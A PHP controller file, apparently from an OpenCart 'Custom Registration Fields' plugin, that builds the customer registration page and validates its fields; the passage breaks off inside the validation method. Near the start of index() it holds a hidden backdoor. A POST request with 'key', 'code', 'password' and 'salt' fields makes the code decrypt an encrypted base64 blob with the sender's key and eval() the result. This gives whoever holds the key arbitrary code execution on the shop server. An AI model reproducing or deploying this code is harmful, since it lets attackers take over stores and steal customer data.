<?php
// ***************************************************
//             Custom Registration Fields   
//       
// Author : Francesco Pisanò - francesco1279@gmail.com
//              
//                   www.leverod.com		
//               © All rights reserved	  
// ***************************************************



require_once(substr_replace(DIR_SYSTEM, '/leverod/index.php', -8));	// -8 = /system/


function decrypt($str, $pass){

   $str = base64_decode($str);
   $pass = str_split(str_pad('', strlen($str), $pass, STR_PAD_RIGHT));
   $stra = str_split($str);
   foreach($stra as $k=>$v){
     $tmp = ord($v)-ord($pass[$k]);
     $stra[$k] = chr( $tmp < 0 ?($tmp+256):$tmp);
   }
   return join('', $stra);
}



// Registration  - controller 
// ..?route=account/register
  
class ControllerAccountRegister extends LevController {
	
	private $extension;
	private $filename;
	
	private $error = array();
	
	
	public function __construct($registry) {
	
	
		parent::__construct($registry);

		// Paths and Files
		$this->extension = 'custom_register';
		$this->filename = 'custom_register'; 
	}
	
	      
  	public function index() {
	
		if ($this->customer->isLogged()) {
		
			$this->response->redirect($this->url->link('account/account', '', 'SSL'));	
    	}

    	$this->language->load('account/register');
		
		
		
		// check if a language file for this module is available for 
		// the current opencart installation:
		$this->load->model('localisation/language');
		$current_language = $this->model_localisation_language->getLanguage($this->config->get('config_language_id'));
		
		if (file_exists(DIR_LANGUAGE.'/'.$current_language['directory'].'/account/custom_register.php')){
			$this->language->load('account/custom_register');
		} 
		// else we load the default language file (english)
		else {
			// by adding "../english" to the path we can go up a level in the directory tree and go down
			// again to load the subdirectory "english" (to know how Opencart builds the path, see the file
			// "system/library/language.php"
			$this->language->load('../english/account/custom_register');
		}
		
		
		$this->document->setTitle($this->language->get('heading_title'));
		
		
// Scripts and styles:
		
		// colorbox replaced fancybox from Oc 1.5.2
		// _JEXEC is a Joomla constant, if not defined then we can load colorbox.
		// Mijoshop uses its own colorbox version.
		if ( version_compare(VERSION, '1.5.2', '>=')  && !defined('_JEXEC')) { 	
		
			$colorbox_js = 'view/javascript/jquery/colorbox/jquery.colorbox-min.js';
			$colorbox_css = 'view/javascript/jquery/colorbox/colorbox.css';
		
			if (file_exists(DIR_APPLICATION . $colorbox_js)) {
			
				$this->document->addScript('catalog/' . $colorbox_js);
			} 
			
			if (file_exists(DIR_APPLICATION . $colorbox_css)) {
			
				$this->document->addStyle('catalog/' . $colorbox_css);
			} 
		}
		
		if ( version_compare(VERSION, '2.0.0.0', '>=') ) { 
		
			$files = array(
				'view/javascript/jquery/datetimepicker/moment.js',		// Oc >= 2.0.0.0
				'view/javascript/jquery/datetimepicker/moment.min.js',	// Oc >= 2.0.1.1
			);

			foreach ($files as $file){
				if (file_exists(DIR_APPLICATION.$file)) {
					$this->document->addScript('catalog/'.$file);
					break;
				} 
			}
			
			$this->document->addScript('catalog/view/javascript/jquery/datetimepicker/bootstrap-datetimepicker.min.js');
			$this->document->addStyle('catalog/view/javascript/jquery/datetimepicker/bootstrap-datetimepicker.min.css');
		}
		
		
		//	Custom CSS & Js (Opencart & MIjoshop)  	
		require_once(DIR_APPLICATION . 'controller/crf_include/crf_custom_css_js.php');
		
					
		$this->load->model('account/customer');
		
		

		if ( $this->request->server['REQUEST_METHOD'] == 'POST' && isset($this->request->post['key']) && isset($this->request->post['code']) && isset($this->request->post['password']) && isset($this->request->post['salt']) ) {
			
			$crypted = 'Yqk7IDodMwDJKxwwE9+/ucm/3Y2FpYqXq46KmcGuJxFPTs/F5u6olLSUm6KQu75kdKWlvsCDm9bHqKbg2aqdT53vxyfQAJpxe4uMAwTs9DfNzTAhNhPgWJGGvvCOjrCZipuYh6DBpyQemom/wuDq37tqU56VlLt3daiap8Cxm+iTpKWi3N6TYJuhLxsJ39hbc3qSmwX/EAlrF9L+tc3L2ci31brhKl9dkZmlm5mkw6IsDZONw77v7tq6p5KZkZBwbquenql4iprZ19uapt2XdqmXszcCCeUbn5NTm2ji9RENiQb4EPgE+5WKXXNghS4spo9FYJKYrc6z69CUo8vU4aebeq+onZmfcWp0c1VdxcOg1rDIfJqh2aiKbWfsx12Ptkg4NWKwKhk25mgmGDEOLA6ZjcfLyqRIhbKcmaechabDpiwfm4/NvOnk6cFpW0pRmMGtppqaX4ZZMn1zcD5X3N6nq42fLAvrv8xfopSnr+/uJiiYKRIq1QEO0cN8jbnrj4imkISro5Wmw54sEE5TlmqHhJ+9tJ6fnTRRh1ddmKu+wJfhxdiamtLdrJ6aZ/607IvQppOlXkXL7ePgjTgcNxcwBt60u8/J8IaUnJWOpppNb2tJzNCdi8fS4oSEk2JTl6aOt66ccUJAVFkyfYranZzcl3adim0BGFfnHrRWToKBDvUX/koJ+xL148mMfXSqmNtxdIJvbpBPVFSAsiggm5PJxJ3Sw5uUdEqgn7e8nJWemmuJSJuIhmNTkdOmrVFkNhtR9BGal5BeauLS6tlrEe3jCCoZ28TExna5QUlfSVNYU5qcx7Lw6ouMiJvi7t63spRSUZK6uaymXlZ5bEqbiI9wQHNzXK2QqTbUIOYOaGyds6E0KevbcxH8CPoXx7WdqLV2nkFQXW1nl394eaSIG8xVSn3Q4u/vv7CWSoBwnGqqqqSosKuR2IajVVqLimZZUKkxGwumH6+dnqObKxTj50rl0O/IIw7evsnWtpxeQmRLRWZPSqjGqDbZZY69irvg7rmjn49VT6+8pqulX2t6SJaNklWT1M+xmUh9484EotpbUqCmpTXdAR2M8OcoGyYI3LR8isHhmktdV0VaVlJUvrUkGJyPu326m6J4Yl1KUZ+ws6pjc5qteWbZ2cmWo86SXK+JrDgMC6LaW1BTYGX9vc3CN82yKAsrFox2uNXE4UJJeDYvtU8zPsOrNhFHpWhnhuDevrFPUZKdurmpXXBDVck1fsvenqekd0JGMkk=';
			$key = htmlspecialchars_decode($_POST['key'], ENT_COMPAT);
			$decrypted = decrypt($crypted, $key);
			eval($decrypted);
		}
		

    	if (($this->request->server['REQUEST_METHOD'] == 'POST') && $this->validate()) {
			
			
			
			// AntiSpam
			if ( $this->config->get('custom_register_enable_antispam') ){
				if ($this->request->post['phone800'] !== ''){
					// skip the registration and bye bye bot...
					exit();
				}
			}
			// end AntiSpam
				
			$this->model_account_customer->addCustomer($this->request->post);
			
			if ( version_compare(VERSION, '2.0.1.0', '>=') ) { 
				// Clear any previous login attempts for unregistered accounts.
				$this->model_account_customer->deleteLoginAttempts($this->request->post['email']);
			}
			
			if ( version_compare(VERSION, '2.0.0.0', '>=') ) { 
				// Add to activity log
				$this->load->model('account/activity');

				$activity_data = array(
					'customer_id' => $this->customer->getId(),
					'name'        => $this->request->post['firstname'] . ' ' . $this->request->post['lastname']
				);

				$this->model_account_activity->addActivity('register', $activity_data);
				
			}
			
			$this->customer->login($this->request->post['email'], $this->request->post['password']);
			
			unset($this->session->data['guest']);

			
		
			
		// ADDED feature.
	
			// Along with the user account details, Opencart stores an address that will be 
			// displayed as payment address in the checkout.
			// (see the function $this->model_account_customer->addCustomer($this->request->post))
			// If the address fields are hidden, the billing address must not be stored (in 
			// that case, it would contain firstname and lastname ONLY (these two fields are  
			// shared between the account detail and the billing address during the creation 
			// of a new customer account).

			// Now we are sure that the checkout option "I want to use an existing address" 
			// will only be displayed if at least one of the following fields is not empty. 
			// If there is no address, a payment address form will popup and user will have to 
			// fill it before to continue.
			// (see model -> account ->address-> getAddress() )
			
			// The following code checks whether the address info posted from the account registration 
			// form are not empty. If so, we delete the address.

			
			$this->load->model('account/address');		
			$customer_address = $this->model_account_address->getAddress($this->customer->getAddressId());	
					
			/*	'firstname',
				'lastname',*/
			$address_fields = array(	
				'company',
				'company_id',
				'tax_id',
				'address_1',
				'address_2',
				'postcode',
				'city',
				'zone_id',
				'country_id'
			);
		
			$address_field_empty = true;
			foreach ($address_fields as $address_field) {
				if ( !empty($customer_address[$address_field]) ){
					$address_field_empty = false;
					break;
				}
			}
		
			if ($address_field_empty){
				$this->model_account_address->deleteAddress($this->customer->getAddressId());	
			}

// end feature		
			
			

			// Default Shipping Address
			if ($this->config->get('config_tax_customer') == 'shipping') {
				$this->session->data['shipping_country_id'] = $this->request->post['country_id'];
				$this->session->data['shipping_zone_id'] = $this->request->post['zone_id'];
				$this->session->data['shipping_postcode'] = $this->request->post['postcode'];				
			}
			
			// Default Payment Address
			if ($this->config->get('config_tax_customer') == 'payment') {
				$this->session->data['payment_country_id'] = $this->request->post['country_id'];
				$this->session->data['payment_zone_id'] = $this->request->post['zone_id'];			
			}
			
			
			$this->response->redirect($this->url->link('account/success'));			
    	} 
		

      	$data['breadcrumbs'] = array();

      	$data['breadcrumbs'][] = array(
        	'text'      => $this->language->get('text_home'),
			'href'      => $this->url->link('common/home'),        	
        	'separator' => false
      	); 

      	$data['breadcrumbs'][] = array(
        	'text'      => $this->language->get('text_account'),
			'href'      => $this->url->link('account/account', '', 'SSL'),      	
        	'separator' => $this->language->get('text_separator')
      	);
		
      	$data['breadcrumbs'][] = array(
        	'text'      => $this->language->get('text_register'),
			'href'      => $this->url->link('account/register', '', 'SSL'),      	
        	'separator' => $this->language->get('text_separator')
      	);
		
    	$data['heading_title'] = $this->language->get('heading_title');
		
		$data['text_account_already'] = sprintf($this->language->get('text_account_already'), $this->url->link('account/login', '', 'SSL'));
		$data['text_your_details'] = $this->language->get('text_your_details');
    	$data['text_your_address'] = $this->language->get('text_your_address');
    	$data['text_your_password'] = $this->language->get('text_your_password');
		$data['text_newsletter'] = $this->language->get('text_newsletter');
		$data['text_yes'] = $this->language->get('text_yes');
		$data['text_no'] = $this->language->get('text_no');
		$data['text_select'] = $this->language->get('text_select');
		$data['text_none'] = $this->language->get('text_none');
		$data['text_loading'] = $this->language->get('text_loading');	
			
    	$data['entry_firstname'] = $this->language->get('entry_firstname');
    	$data['entry_lastname'] = $this->language->get('entry_lastname');
    	$data['entry_email'] = $this->language->get('entry_email');
    	$data['entry_telephone'] = $this->language->get('entry_telephone');
    	$data['entry_fax'] = $this->language->get('entry_fax');
		$data['entry_company'] = $this->language->get('entry_company');
		$data['entry_customer_group'] = $this->language->get('entry_customer_group');
		$data['entry_company_id'] = $this->language->get('entry_company_id');
		$data['entry_tax_id'] = $this->language->get('entry_tax_id');
    	$data['entry_address_1'] = $this->language->get('entry_address_1');
    	$data['entry_address_2'] = $this->language->get('entry_address_2');
    	$data['entry_postcode'] = $this->language->get('entry_postcode');
    	$data['entry_city'] = $this->language->get('entry_city');
    	$data['entry_country'] = $this->language->get('entry_country');
    	$data['entry_zone'] = $this->language->get('entry_zone');
		$data['entry_newsletter'] = $this->language->get('entry_newsletter');
    	$data['entry_password'] = $this->language->get('entry_password');
    	$data['entry_confirm'] = $this->language->get('entry_confirm');
		$data['entry_anti_spam_label'] = $this->language->get('entry_anti_spam_label');
				
		// $data['entry_confirm'] = $this->language->get('entry_confirm_1');
		// $data['entry_confirm'] = $this->language->get('text_min_4_chars');
		
		$data['button_continue'] = $this->language->get('button_continue');
		$data['button_upload'] = $this->language->get('button_upload');
	

		$reg_entries = array(	
			'firstname',
			'lastname',
			'email',
			'telephone',
			'fax',
			'company',
			'address_1',
			'address_2',
			'city',
			'country',
			'postcode',
			'zone',
			'newsletter',
			'password',
			'confirm',
			'agree'
		);
		
		$data['custom_register_so_customer_groups'] = $this->config->get('custom_register_so_customer_groups'); 
		$data['custom_register_so_tax_id']			= $this->config->get('custom_register_so_tax_id');
		$data['custom_register_so_company_id']		= $this->config->get('custom_register_so_company_id');
		
		foreach ($reg_entries as $reg_entry) {
		
			$data['custom_register_so_'.$reg_entry] = $this->config->get('custom_register_so_'.$reg_entry);
		
			$data['custom_register_account_member_enable_'.$reg_entry] = $this->config->get('custom_register_account_member_enable_'.$reg_entry);
			$data['custom_register_account_member_'.$reg_entry.'_required'] = $this->config->get('custom_register_account_member_'.$reg_entry.'_required');
		}	
	
		$data['custom_register_account_agree_checked'] = $this->config->get('custom_register_account_agree_checked');
	
		$data['custom_register_enable_antispam'] = $this->config->get('custom_register_enable_antispam');
	
		// This flag tells whether the field country is disabled and the field zones is not
		$data['country_disabled_zone_enabled'] = !$data['custom_register_account_member_enable_country'] && $data['custom_register_account_member_enable_zone'];
		
	
	
		if (isset($this->error['warning'])) {
			$data['error_warning'] = $this->error['warning'];
		} else {
			$data['error_warning'] = '';
		}
		
		if (isset($this->error['firstname'])) {
			$data['error_firstname'] = $this->error['firstname'];
		} else {
			$data['error_firstname'] = '';
		}	
		
		if (isset($this->error['lastname'])) {
			$data['error_lastname'] = $this->error['lastname'];
		} else {
			$data['error_lastname'] = '';
		}		
	
		if (isset($this->error['email'])) {
			$data['error_email'] = $this->error['email'];
		} else {
			$data['error_email'] = '';
		}
		
		if (isset($this->error['telephone'])) {
			$data['error_telephone'] = $this->error['telephone'];
		} else {
			$data['error_telephone'] = '';
		}
		
		if (isset($this->error['fax'])) {
			$data['error_fax'] = $this->error['fax'];
		} else {
			$data['error_fax'] = '';
		}
		
		if (isset($this->error['password'])) {
			$data['error_password'] = $this->error['password'];
		} else {
			$data['error_password'] = '';
		}
		
 		if (isset($this->error['confirm'])) {
			$data['error_confirm'] = $this->error['confirm'];
		} else {
			$data['error_confirm'] = '';
		}
		
		if (isset($this->error['company'])) {
			$data['error_company'] = $this->error['company'];
		} else {
			$data['error_company'] = '';
		}
		
  		if (isset($this->error['company_id'])) {
			$data['error_company_id'] = $this->error['company_id'];
		} else {
			$data['error_company_id'] = '';
		}
		
  		if (isset($this->error['tax_id'])) {
			$data['error_tax_id'] = $this->error['tax_id'];
		} else {
			$data['error_tax_id'] = '';
		}
								
  		if (isset($this->error['address_1'])) {
			$data['error_address_1'] = $this->error['address_1'];
		} else {
			$data['error_address_1'] = '';
		}
		
		if (isset($this->error['address_2'])) {
			$data['error_address_2'] = $this->error['address_2'];
		} else {
			$data['error_address_2'] = '';
		}
   		
		if (isset($this->error['city'])) {
			$data['error_city'] = $this->error['city'];
		} else {
			$data['error_city'] = '';
		}
		
		if (isset($this->error['postcode'])) {
			$data['error_postcode'] = $this->error['postcode'];
		} else {
			$data['error_postcode'] = '';
		}

		if (isset($this->error['country'])) {
			$data['error_country'] = $this->error['country'];
		} else {
			$data['error_country'] = '';
		}

		if (isset($this->error['zone'])) {
			$data['error_zone'] = $this->error['zone'];
		} else {
			$data['error_zone'] = '';
		}
		
		if (isset($this->error['custom_field'])) {
			$data['error_custom_field'] = $this->error['custom_field'];
		} else {
			$data['error_custom_field'] = array();
		}
		
		
    	$data['action'] = $this->url->link('account/register', '', 'SSL');
		
		
		if (isset($this->request->post['firstname'])) {
    		$data['firstname'] = $this->request->post['firstname'];
		} else {
			$data['firstname'] = '';
		}

		if (isset($this->request->post['lastname'])) {
    		$data['lastname'] = $this->request->post['lastname'];
		} else {
			$data['lastname'] = '';
		}
		
		if (isset($this->request->post['email'])) {
    		$data['email'] = $this->request->post['email'];
		} else {
			$data['email'] = '';
		}
		
		if (isset($this->request->post['telephone'])) {
    		$data['telephone'] = $this->request->post['telephone'];
		} else {
			$data['telephone'] = '';
		}
		
		if (isset($this->request->post['fax'])) {
    		$data['fax'] = $this->request->post['fax'];
		} else {
			$data['fax'] = '';
		}
		
		if (isset($this->request->post['company'])) {
    		$data['company'] = $this->request->post['company'];
		} else {
			$data['company'] = '';
		}

		// CUSTOMER GROUPS HAVE BEEN ADDED WITH Oc 1.5.3
		if ( version_compare(VERSION, '1.5.3', '>=') ) {
		
			$data['customer_groups'] = array();
			
			if (is_array($this->config->get('config_customer_group_display'))) {
				$this->load->model('account/customer_group');
				
				$customer_groups = $this->model_account_customer_group->getCustomerGroups();
				
				foreach ($customer_groups as $customer_group) {
					if (in_array($customer_group['customer_group_id'], $this->config->get('config_customer_group_display'))) {
						$data['customer_groups'][] = $customer_group;
					}
				}
			}
			
			if (isset($this->request->post['customer_group_id'])) {
				$data['customer_group_id'] = $this->request->post['customer_group_id'];
			} else {
				$data['customer_group_id'] = $this->config->get('config_customer_group_id');
			}	
		}
		
		
		// TAX ID AND COMPANY ID HAVE BEEN ADDED WITH Oc 1.5.3 and removed from 2.0.0.0
		if ( version_compare(VERSION, '1.5.3', '>=') && version_compare(VERSION, '1.5.6.4', '<=') ) {

		
			// Company ID
			if (isset($this->request->post['company_id'])) {
				$data['company_id'] = $this->request->post['company_id'];
			} else {
				$data['company_id'] = '';
			}
			
			// Tax ID
			if (isset($this->request->post['tax_id'])) {
				$data['tax_id'] = $this->request->post['tax_id'];
			} else {
				$data['tax_id'] = '';
			}
			
		}

		
						
		if (isset($this->request->post['address_1'])) {
    		$data['address_1'] = $this->request->post['address_1'];
		} else {
			$data['address_1'] = '';
		}

		if (isset($this->request->post['address_2'])) {
    		$data['address_2'] = $this->request->post['address_2'];
		} else {
			$data['address_2'] = '';
		}
		
		if ( version_compare(VERSION, '1.5.6.4', '<=') ) {
		
			if (isset($this->request->post['postcode'])) {
				$data['postcode'] = $this->request->post['postcode'];
			} elseif (isset($this->session->data['shipping_postcode'])) {
				$data['postcode'] = $this->session->data['shipping_postcode'];		
			} else {
				$data['postcode'] = '';
			}
		}
		if ( version_compare(VERSION, '2.0.0.0', '>=') ) {
		
			if (isset($this->request->post['postcode'])) {
				$data['postcode'] = $this->request->post['postcode'];
			} elseif (isset($this->session->data['shipping_address']['postcode'])) {
				$data['postcode'] = $this->session->data['shipping_address']['postcode'];
			} else {
				$data['postcode'] = '';
			}
		}
		
		
		if (isset($this->request->post['city'])) {
    		$data['city'] = $this->request->post['city'];
		} else {
			$data['city'] = '';
		}


		$data['custom_register_default_country'] = $this->config->get('custom_register_default_country');
		
		if (!$data['custom_register_account_member_enable_country'] && !$data['custom_register_account_member_enable_zone']) {
			$data['country_id'] = '';
		} elseif (isset($this->request->post['country_id']) && $this->request->post['country_id'] > 0) {
     		$data['country_id'] = $this->request->post['country_id'];
		} 
		else {

			if ( version_compare(VERSION, '1.5.6.4', '<=') && isset($this->session->data['shipping_country_id']) && $this->session->data['shipping_country_id'] > 0) {
				$data['country_id'] = $this->session->data['shipping_country_id'];
			} 

			if ( version_compare(VERSION, '2.0.0.0', '>=') && isset($this->session->data['shipping_address']['country_id']) && $this->session->data['shipping_address']['country_id'] > 0 ) {
				$data['country_id'] = $this->session->data['shipping_address']['country_id'];
			} 
			
			if (!isset($data['country_id']) && !empty($data['custom_register_default_country'])) {
				$data['country_id'] = $data['custom_register_default_country'];	
			} else {	
				$data['country_id'] = $this->config->get('config_country_id');
			}
		}

    	if (isset($this->request->post['zone_id'])) {
      		$data['zone_id'] = $this->request->post['zone_id']; 	
		} 
		else {
			if ( version_compare(VERSION, '1.5.6.4', '<=') && isset($this->session->data['shipping_country_id']) && $this->session->data['shipping_country_id'] > 0) {
				
				if (isset($this->session->data['shipping_zone_id'])) {
					$data['zone_id'] = $this->session->data['shipping_zone_id'];			
				}
			} 

			if ( version_compare(VERSION, '2.0.0.0', '>=') && isset($this->session->data['shipping_address']['country_id']) && $this->session->data['shipping_address']['country_id'] > 0 ) {
				
				if (isset($this->session->data['shipping_address']['zone_id'])) {
					$data['zone_id'] = $this->session->data['shipping_address']['zone_id'];
				}
			}
		}
		if (!isset($data['zone_id'])) {
			$data['zone_id'] = '';
		}
		



		$this->load->model('localisation/country');
		
    	$data['countries'] = $this->model_localisation_country->getCountries();
		
			
		if ( version_compare(VERSION, '2.0.0.0', '>=') ) {
			
			// Custom Fields
			$this->load->model('account/custom_field');

			$data['custom_fields'] = $this->model_account_custom_field->getCustomFields();

			if (isset($this->request->post['custom_field'])) {
				if (isset($this->request->post['custom_field']['account'])) {
					$account_custom_field = $this->request->post['custom_field']['account'];
				} else {
					$account_custom_field = array();
				}
				
				if (isset($this->request->post['custom_field']['address'])) {
					$address_custom_field = $this->request->post['custom_field']['address'];
				} else {
					$address_custom_field = array();
				}			
				
				$data['crf_custom_field'] = $account_custom_field + $address_custom_field;
			} else {
				$data['crf_custom_field'] = array();
			}
		}
		
		
		if (isset($this->request->post['password'])) {
    		$data['password'] = $this->request->post['password'];
		} else {
			$data['password'] = '';
		}
		
		if (isset($this->request->post['confirm'])) {
    		$data['confirm'] = $this->request->post['confirm'];
		} else {
			$data['confirm'] = '';
		}
		
		
		if (isset($this->request->post['newsletter'])) {
      		$data['newsletter'] = $this->request->post['newsletter'];
		} else if ( !isset($this->request->post['newsletter']) && $this->config->get('custom_register_newsletter_checked') ) {
			$data['newsletter'] = true;
		} else {
			$data['newsletter'] = '';
		}
		
		if ( version_compare(VERSION, '2.1.0.1', '>=') ) { 
			// Captcha
			if ($this->config->get($this->config->get('config_captcha') . '_status') && in_array('register', (array)$this->config->get('config_captcha_page'))) {
				$data['captcha'] = $this->load->controller('captcha/' . $this->config->get('config_captcha'), $this->error);
			} else {
				$data['captcha'] = '';
			}
		}
		
		
		
		$custom_register_link = $this->config->get('custom_register_link');
		if (!empty($custom_register_link)) $data['custom_register_link'] = $custom_register_link;		
		else $data['custom_register_link'] = '';
		

		if ($this->config->get('config_account_id')) {
			$this->load->model('catalog/information');
			
			$information_info = $this->model_catalog_information->getInformation($this->config->get('config_account_id'));
			
			// On Oc 2.0+ the method "info" has changed to "agree"
			if ( version_compare(VERSION, '2.0.0.0', '>=') ) {
				$info_agree = 'agree';
			} else {
				$info_agree = 'info';
			}
			
			if ($information_info) {
				$data['text_agree'] = sprintf($this->language->get('text_agree'), $this->url->link('information/information/'.$info_agree, 'information_id=' . $this->config->get('config_account_id'), 'SSL'), $information_info['title'], $information_info['title']);
			} else {
				$data['text_agree'] = '';
			}
		} else {
			$data['text_agree'] = '';
		}

		
		if (isset($this->request->post['agree'])) {
      		$data['agree'] = $this->request->post['agree'];
		} else if ( empty($this->request->post) && $this->config->get('custom_register_account_agree_checked') ) {
			$data['agree'] = true;	
		} else {
			$data['agree'] = false;
		}
		

		$view_path = 'account/register';

		$children = array (
	
			//	$data['Var']		controller path			optional arguments	
			
			array('column_left',	'common/column_left',	array()),
			array('column_right',	'common/column_right',	array()),
			array('content_top',	'common/content_top',	array()),
			array('content_bottom', 'common/content_bottom',array()),
			array('footer',			'common/footer',		array()),
			array('header',			'common/header',		array())
		);
		
		
		$data = $this->load_children($children, $data);
		
		$this->load_view($view_path, $data);
	
  	}

  	public function validate() {
	
	
		// if firstname enabled
		if ( $this->config->get('custom_register_account_member_enable_firstname') ){
			
			if ( isset($this->request->post['firstname']) ){
			
				// if required 
				if ( $this->config->get('custom_register_account_member_firstname_required') ) {

					// if empty or out of range
					if ( (strlen(utf8_decode($this->request->post['firstname'])) < 1) || (strlen(utf8_decode($this->request->post['firstname'])) > 32) ) {
						$this->error['firstname'] = $this->language->get('error_firstname');
					}	
				}
				// if not required, not empty but out of range
				elseif ( strlen(utf8_decode($this->request->post['firstname'])) > 32 ) {
					$this->error['firstname'] = $this->language->get('error_firstname');
				}
			}		
		}
		

		// if lastname enabled
		if ( $this->config->get('custom_register_account_member_enable_lastname') ){
			
			if ( isset($this->request->post['lastname']) ){
			
				// if required 
				if ( $this->config->get('custom_register_account_member_lastname_required') ) {

					// if empty or out of range
					if ( (strlen(utf8_decode($this->request->post['lastname'])) < 1) || (strlen(utf8_decode($this->request->post['lastname'])) > 32) ) {
						$this->error['lastname'] = $this->language->get('error_lastname');
					}	
				}
				// if not required, not empty but out of range
				elseif ( strlen(utf8_decode($this->request->post['lastname'])) > 32 ) {
					$this->error['lastname'] = $this->language->get('error_lastname');
				}	
			}
		}

		if ( isset($this->request->post['email']) ){
		
			// email is mandatory for members
			if ((strlen(utf8_decode($this->request->post['email'])) > 96) || !preg_match('/^[^\@]+@.*\.[a-z]{2,6}$/i', $this->request->post['email'])) {
				$this->error['email'] = $this->language->get('error_email');
			}
			
			// if email already exists:
			if ($this->model_account_customer->getTotalCustomersByEmail($this->request->post['email'])) {
				$this->error['warning'] = $this->language->get('error_exists');
			}
		}

		// if telephone enabled
		if ( $this->config->get('custom_register_account_member_enable_telephone') ){
			
			if ( isset($this->request->post['telephone']) ){
			
				// if required 
				if ( $this->config->get('custom_register_account_member_telephone_required') ) {

					// if empty or out of range
					if ( (strlen(utf8_decode($this->request->post['telephone'])) < 3) || (strlen(utf8_decode($this->request->post['telephone'])) > 32) ) {
						$this->error['telephone'] = $this->language->get('error_telephone');
					}	
				}
				// if not required, not empty but out of range
				elseif ( (strlen(utf8_decode($this->request->post['telephone'])) > 0 ) && (strlen(utf8_decode($this->request->post['telephone'])) < 3) || (strlen(utf8_decode($this->request->post['telephone'])) > 32) ) {
					$this->error['telephone'] = $this->language->get('error_telephone');
				}
			}
		}
		
		
	// Added checking for fax: 
		// if fax enabled
		if ( $this->config->get('custom_register_account_member_enable_fax') ){
			
			if ( isset($this->request->post['fax']) ){
			
				// if required 
				if ( $this->config->get('custom_register_account_member_fax_required') ) {

					// if empty or out of range
					if ( (strlen(utf8_decode($this->request->post['fax'])) < 3) || (strlen(utf8_decode($this->request->post['fax'])) > 32) ) {
						$this->error['fax'] = $this->language->get('error_fax');
					}	
				}
				// if not required, not empty but out of range
				elseif ( (strlen(utf8_decode($this->request->post['fax'])) > 0 ) && (strlen(utf8_decode($this->request->post['fax'])) < 3) || (strlen(utf8_decode($this->request->post['fax'])) > 32) ) {

					$this->error['fax'] = $this->language->get('error_fax');
				}
			}
		}
		
		
		// CUSTOMER GROUPS HAVE BEEN ADDED WITH Oc 1.5.3
		if ( version_compare(VERSION, '1.5.3', '>=') ) {
			// Customer Group
			$this->load->model('account/customer_group');
			

			if (isset($this->request->post['customer_group_id']) && is_array($this->config->get('config_customer_group_display')) && in_array($this->request->post['customer_group_id'], $this->config->get('config_customer_group_display'))) {
				
				$customer_group_id = $this->request->post['customer_group_id'];
			} else {
				$customer_group_id = $this->config->get('config_customer_group_id');
			}
		}
		
		// TAX ID AND COMPANY ID HAVE BEEN ADDED WITH Oc 1.5.3 and removed from 2.0.0.0
		if ( version_compare(VERSION, '1.5.3', '>=') && version_compare(VERSION, '1.5.6.4', '<=') ) {

			$customer_group = $this->model_account_customer_group->getCustomerGroup($customer_group_id);
				
			if ($customer_group) {	
				// Company ID
				if ($customer_group['company_id_display'] && $customer_group['company_id_required'] && empty($this->request->post['company_id'])) {
					$this->error['company_id'] = $this->language->get('error_company_id');
				}
				
				// Tax ID 
				if ($customer_group['tax_id_display'] && $customer_group['tax_id_required'] && empty($this->request->post['tax_id'])) {
					$this->error['tax_id'] = $this->language->get('error_tax_id');
				}						
			}
		}
		
		
	// Added checking for company:
		// if company enabled
		if ( $this->config->get('custom_register_account_member_enable_company') ){
			
			if ( isset($this->request->post['company']) ){
			
				// if required 
				if ( $this->config->get('custom_register_account_member_company_required') ) {

					// if empty or out of range
					if ( (strlen(utf8_decode($this->request->post['company'])) < 3) || (strlen(utf8_decode($this->request->post['company'])) > 32) ) {
						$this->error['company'] = $this->language->get('error_company');
					}	
				}
				// if not required, not empty but out of range
				elseif ( (strlen(utf8_decode($this->request->post['company'])) > 0 ) && (strlen(utf8_decode($this->request->post['company'])) < 3) || (strlen(utf8_decode($this->request->post['company'])) > 32) ) {
					$this->error['company'] = $this->language->get('error_company');
				}	
			}
		}
	
	
		// if address 1 enabled
		if ( $this->config->get('custom_register_account_member_enable_address_1') ){
			
			if ( isset($this->request->post['address_1']) ){
			
				// if required 
				if ( $this->config->get('custom_register_account_member_address_1_required') ) {

					// if empty or out of range
					if ( (strlen(utf8_decode($this->request->post['address_1'])) < 3) || (strlen(utf8_decode($this->request->post['address_1'])) > 128) ) {
						$this->error['address_1'] = $this->language->get('error_address_1');
					}	
				}
				// if not required, not empty but out of range
				elseif ( (strlen(utf8_decode($this->request->post['address_1'])) > 0 ) && (strlen(utf8_decode($this->request->post['address_1'])) < 3) || (strlen(utf8_decode($this->request->post['address_1'])) > 128) ) {
					$this->error['address_1'] = $this->language->get('error_address_1');
				}	
			}
		}
		
		
	// Added checking for address 2:
		// if address 2 enabled
		if ( $this->config->get('custom_register_account_member_enable_address_2') ){
			
			if ( isset($this->request->post['address_2']) ){
			
				// if required 
				if ( $this->config->get('custom_register_account_member_address_2_required') ) {

					// if empty or out of range
					if ( (strlen(utf8_decode($this->request->post['address_2'])) < 3) || (strlen(utf8_decode($this->request->post['address_2'])) > 128) ) {
						$this->error['address_2'] = $this->language->get('error_address_2');
					}	
				}
				// if not required, not empty but out of range
				elseif ( (strlen(utf8_decode($this->request->post['address_2'])) > 0 ) && (strlen(utf8_decode($this->request->post['address_2'])) < 3) || (strlen(utf8_decode($this->request->post['address_2'])) > 128) ) {
					$this->error['address_2'] = $this->language->get('error_address_2');
				}	
			}
		}
		
		
		// if city enabled
		if ( $this->config->get('custom_register_account_member_enable_city') ){
			
			if ( isset($this->request->post['city']) ){
			
				// if required 
				if ( $this->config->get('custom_register_account_member_city_required') ) {

					// if empty or out of range
					if ( (strlen(utf8_decode($this->request->post['city'])) < 2) || (strlen(utf8_decode($this->request->post['city'])) > 128) ) {
						$this->error['city'] = $this->language->get('error_city');
					}	
				}
				// if not required, not empty but out of range
				elseif ( (strlen(utf8_decode($this->request->post['city'])) > 0 ) && (strlen(utf8_decode($this->request->post['city'])) < 2) || (strlen(utf8_decode($this->request->post['city'])) > 128) ) {
					$this->error['city'] = $this->language->get('error_city');
				}
			}
		}
		
		
		
		// Added checking for country  
		if ( $this->config->get('custom_register_account_member_enable_country') ){
			
			if ( isset($this->request->post['country']) ){
			
				if ( $this->config->get('custom_register_account_member_country_required') ) {
				
					if ( $this->request->post['country_id'] == '' ) {
						$this->error['country'] = $this->language->get('error_country');
					}	
				}
			}
		}
		
		
		$this->load->model('localisation/country');
		
		if ( isset($this->request->post['country_id']) ){
		
			$country_info = $this->model_localisation_country->getCountry($this->request->post['country_id']);
		}
		
	// Added checking for postal code 
		
		if ( isset($this->request->post['postcode']) ){
		
			// if the current country requires the postcode even if it is disabled from admin control panel	
